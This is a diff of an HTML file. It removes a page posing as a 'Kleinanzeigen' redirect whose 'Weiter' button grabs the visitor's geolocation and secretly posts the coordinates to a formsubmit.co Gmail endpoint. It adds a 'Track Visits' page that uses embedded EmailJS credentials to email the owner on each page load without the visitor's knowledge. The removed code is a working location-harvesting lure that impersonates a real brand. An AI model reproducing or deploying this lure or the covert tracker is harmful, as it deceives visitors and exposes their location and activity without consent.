@@ -1,65 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Weiterleitung</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
-    #location {
-      margin-top: 20px;
-      font-size: 18px;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Track Visits</title>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init('9x-l5mk9badvHiIkw'); 
+        })();
+
+        // Function to send email
+        function sendVisitEmail() {
+            emailjs.send('service_3ubhjey', 'template_pvr5hq8', {
+                message: 'A visitor has landed on your website!',
+            })
+            .then(() => console.log('Email sent successfully!'))
+            .catch((error) => console.error('Failed to send email:', error));
+        }
+
+        // Trigger the email on page load
+        window.onload = sendVisitEmail;
+    </script>
 </head>
 <body>
-  <h1>Kleinanzeigen</h1>
-  <button id="getLocationBtn">Weiter</button>
-  <div id="location"></div>
-
-  <form action="https://formsubmit.co/alex69gggamer@gmail.com" method="POST" id="locationForm" style="display:none;">
-    <input type="hidden" name="_subject" value="New Location Submitted">
-    <input type="hidden" name="_next" value="https://your-redirect-url.com">
-    <input type="hidden" name="latitude" id="latitude">
-    <input type="hidden" name="longitude" id="longitude">
-  </form>
-
-  <script>
-    const button = document.getElementById('getLocationBtn');
-    const locationDiv = document.getElementById('location');
-    const locationForm = document.getElementById('locationForm');
-    const latitudeInput = document.getElementById('latitude');
-    const longitudeInput = document.getElementById('longitude');
-
-    button.addEventListener('click', () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const { latitude, longitude } = position.coords;
-            locationDiv.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
-            latitudeInput.value = latitude;
-            longitudeInput.value = longitude;
-            
-            // Submit the form to send the email
-            locationForm.submit();
-          },
-          (error) => {
-            locationDiv.textContent = `Error: ${error.message}`;
-          }
-        );
-      } else {
-        locationDiv.textContent = "Geolocation is not supported by your browser.";
-      }
-    });
-  </script>
+    <h1>Welcome to My Website</h1>
+    <p>Thanks for visiting!</p>
 </body>
 </html>
